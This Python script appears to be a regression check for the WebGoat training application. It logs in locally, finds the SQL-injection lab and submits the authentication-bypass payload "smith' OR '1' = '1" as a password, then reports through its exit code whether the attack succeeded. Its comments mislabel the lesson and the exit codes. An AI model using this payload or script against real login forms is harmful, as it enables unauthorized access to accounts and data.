import requests
import re

# Request session object

s = requests.Session()
s.stream = True

# --[STEP 00 ]--
# Request login page

url = "http://127.0.0.1:8080/WebGoat/login.mvc"
first = s.get(url)

# --[ STEP 01 ]--
# Log into WebGoat

url2 = "http://127.0.0.1:8080/WebGoat/j_spring_security_check"
payload = {'username':'webgoat','password':'webgoat'}
login = s.post(url2, data=payload)

# --[ STEP 02 ]--
# Figure out which menu item is "Http Basics"

# --[ STEP 3 ]--
# Request the lesson for General => Http Basics

lessonurlb = "http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc"
lessonurl = "http://127.0.0.1:8080/WebGoat/attack?Screen=32&menu=1100"
lesson = s.get(lessonurl)
lessonb = s.get(lessonurlb)

found = False
exploit = {}
screennum = 0

for i,j in enumerate(lessonb.json()):
   for a,b in j.items():
      if (type(b) is unicode and b == "Injection Flaws"):
         found = True
      if (found == True and type(b) is list):
         for lista in b:
            for c,d in lista.items():
               if (type(c) is unicode and d == "LAB: SQL Injection"):
                 exploit = lista
                 break
   found = False
   if (found):
      break

#  Simple regex
reg = re.compile(u'attack\?Screen=([\d]+)')
screen_str = ""

for n, v in exploit.items():
   if (type(v) is list):
      for li in v:
         if type(li) is dict:
            for key, val in li.items():
               if (key == "link"):
                  screen_str = val

screen_list = re.findall(reg, screen_str)
screen_num = screen_list[0]

# --[ STEP 4 ]--
# Submit the attack to the General => Http Basics page
#ATTACK=`echo -n "1"`

attack_url = "http://127.0.0.1:8080/WebGoat/start.mvc"
att = s.get(attack_url)
attack_url2 = "http://127.0.0.1:8080/WebGoat/attack?Screen=" + str(screen_num) + "&menu=1100"
att_pay = {'employee_id':'112','password':"smith' OR '1' = '1"}
att_login = s.post(attack_url2, data=att_pay)

isStage1 = False
verify = False
listb = exploit.items()
for child in listb[-2][1]:
   for ele,ele2 in child.items():
      if (ele2 == "Stage 1: String SQL Injection"):
        isStage1 = True
      if (ele == "complete" and ele2 == True):
        verify = True
   if (isStage1):
     break

# Purposefully fail for testing purposes
#ATTACK=`echo -n "1"`

# --[ STEP 6 ]--
# Set the correct exit code
# It will return a
# - 0 (error) if the vulnerability is present
# - 1 (success) if the vulnerability is fixed (aka not present)

if (verify):
   print "Attack Successful"
   exit(0)
else:
   print "vuln-15 not present"
   exit(1)
